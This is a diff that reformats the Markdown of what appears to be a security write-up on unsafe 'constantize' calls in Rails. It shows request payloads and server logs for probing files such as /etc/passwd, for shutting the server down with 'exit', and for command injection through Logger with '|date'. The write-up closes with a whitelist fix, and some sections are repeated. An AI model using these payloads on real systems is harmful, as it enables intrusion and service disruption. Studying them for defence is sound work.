@@ -30,7 +30,7 @@ class TesteController < ApplicationController
     end
 ```
 
-** Querying a non-existing module **
+**Querying a non-existing module**
 
 ```
 Started GET "/teste/index?class=Raaaaa" for 127.0.0.1 at 2013-02-10 21:09:01 -0200
@@ -42,7 +42,7 @@ NameError (uninitialized constant Raaaaa):
   app/controllers/teste_controller.rb:3:in `index'
 ```
 
-** Querying a non-existing module **
+**Querying a non-existing module**
 
 ```
 Started GET "/teste/index?class=Devise" for 127.0.0.1 at 2013-02-10 21:14:14 -0200
@@ -118,29 +118,32 @@ class TesteController < ApplicationController
         r = obj.somemethod
         ...
     end
-File and directory enumeration
+```
+**File and directory enumeration**
 
 If the code makes a call to new with an user-controllable parameter, then you can use it to enumerate files and directories in the system. Example:
-
+```
 class TesteController < ApplicationController
     def index
         klass = params[:class].constantize
         obj = klass.new(params[:arg])
         ...
     end
+```
 
-Querying an existing file
+**Querying an existing file**
 
-
+```
 Started GET "/teste/index?class=File&arg=/etc/passwd" for 127.0.0.1 at 2013-02-10 21:20:05 -0200
 Processing by TesteController#index as HTML
   Parameters: {"class"=>"File", "arg"=>"/etc/passwd"}
   Rendered teste/index.html.erb within layouts/application (0.1ms)
 Completed 200 OK in 9ms (Views: 8.6ms | ActiveRecord: 0.0ms)
+```
 
-Querying a non-existing file
+**Querying a non-existing file**
 
-
+```
 Started GET "/teste/index?class=File&arg=raaaaaaaa" for 127.0.0.1 at 2013-02-10 21:20:32 -0200
 Processing by TesteController#index as HTML
   Parameters: {"class"=>"File", "arg"=>"raaaaaaaa"}
@@ -148,21 +151,21 @@ Completed 500 Internal Server Error in 0ms
 
 Errno::ENOENT (No such file or directory - raaaaaaaa):
 
-
-Denial of Service
+```
+**Denial of Service**
 
 It is possible to cause a Denial of Service attack, for example, by targeting classes which create symbols from user-controlled input or allow calling arbitrary methods. Example:
-
+```
 class TesteController < ApplicationController
     def index
         klass = params[:class].constantize
         obj = klass.new(params[:arg])
         ...
     end
+```
+**Taking advantage of ActionController::MimeResponds::Collector in Rails 3.2.12. Use "exit!" to shutdown the application server.**
 
-Taking advantage of ActionController::MimeResponds::Collector in Rails 3.2.12. Use "exit!" to shutdown the application server.
-
-
+```
 Started GET "/teste/index?class=ActionController::MimeResponds::Collector&arg[]=exit" for 127.0.0.1 at 2013-02-10 21:27:01 -0200
 Processing by TesteController#index as HTML
   Parameters: {"class"=>"ActionController::MimeResponds::Collector", "arg"=>["exit"]}
@@ -170,10 +173,10 @@ Completed 500 Internal Server Error in 1ms
 SystemExit (exit):
   app/controllers/teste_controller.rb:4:in `new'
   app/controllers/teste_controller.rb:4:in `index'
+```
 
-
-Another Example:
-
+**Another Example:**
+```
 class TesteController < ApplicationController
     def index
         klass = params[:class].constantize
@@ -181,10 +184,10 @@ class TesteController < ApplicationController
         r = obj.somemethod
         ...
     end
+```
+**Taking advantage of ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy [4] in Rails 3.2.12. Use "exit!" to shutdown the application server.**
 
-Taking advantage of ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy [4] in Rails 3.2.12. Use "exit!" to shutdown the application server.
-
-
+```
 Started GET "/teste/index?class=ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy&arg1=xxx&arg2=exit" for 127.0.0.1 at 2013-02-10 21:51:01 -0200
 Connecting to database specified by database.yml
 Processing by TesteController#index as HTML
@@ -195,20 +198,21 @@ Completed 500 Internal Server Error in 1ms
 SystemExit (exit):
   app/controllers/teste_controller.rb:5:in `index'
 
+```
 
-Command Injection
+**Command Injection**
 
 If the code calls the new method, one way to achieve command injection is to instantiate the Logger class. Example:
-
+```
 class TesteController < ApplicationController
     def index
         klass = params[:class].constantize
         obj = klass.new(params[:arg])
         ...
     end
-
+```
 Executing a "date" command
-
+```
 Sun Feb 10 21:33:33 BRST 2013
 
 
@@ -219,12 +223,12 @@ Processing by TesteController#index as HTML
   Parameters: {"class"=>"Logger", "arg"=>"|date"}
   Rendered teste/index.html.erb within layouts/application (3.8ms)
 Completed 200 OK in 344ms (Views: 87.8ms | ActiveRecord: 0.0ms)
-
+```
 
 
 A safer way to use these methods is to apply a whitelist check over the string before the call to ensure that an allowed class/module will be constantized.
 Taking advantage of ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy [4] in Rails 3.2.12. Use "exit!" to shutdown the application server.
-
+```
 
 Started GET "/teste/index?class=ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy&arg1=xxx&arg2=exit" for 127.0.0.1 at 2013-02-10 21:51:01 -0200
 Connecting to database specified by database.yml
@@ -235,21 +239,21 @@ Completed 500 Internal Server Error in 1ms
 
 SystemExit (exit):
   app/controllers/teste_controller.rb:5:in `index'
+```
 
-
-Command Injection
+**Command Injection**
 
 If the code calls the new method, one way to achieve command injection is to instantiate the Logger class. Example:
-
+```
 class TesteController < ApplicationController
     def index
         klass = params[:class].constantize
         obj = klass.new(params[:arg])
         ...
     end
-
+```
 Executing a "date" command
-
+```
 Sun Feb 10 21:33:33 BRST 2013
 
 
@@ -261,6 +265,6 @@ Processing by TesteController#index as HTML
   Rendered teste/index.html.erb within layouts/application (3.8ms)
 Completed 200 OK in 344ms (Views: 87.8ms | ActiveRecord: 0.0ms)
 
-
+```
 
 A safer way to use these methods is to apply a whitelist check over the string before the call to ensure that an allowed class/module will be constantized.
